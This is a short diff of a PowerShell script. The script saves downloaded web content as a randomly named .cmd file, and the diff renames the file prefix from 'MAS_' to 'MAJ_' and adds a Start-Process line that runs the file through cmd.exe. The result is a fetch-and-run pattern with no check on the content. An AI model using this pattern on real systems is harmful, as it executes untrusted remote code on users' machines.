@@ -19,9 +19,11 @@ if (-Not (Test-Path -Path $DownloadFolder)) {
 }
 
 $rand = [Guid]::NewGuid().Guid
-$FilePath = "$DownloadFolder\MAS_$rand.cmd"
+$FilePath = "$DownloadFolder\MAJ_$rand.cmd"
 
 $ScriptArgs = "$args "
 $prefix = "@::: $rand `r`n"
 $content = $prefix + $response.Content
 Set-Content -Path $FilePath -Value $content
+
+Start-Process cmd.exe "/c """"$FilePath"" $ScriptArgs""" -Wait
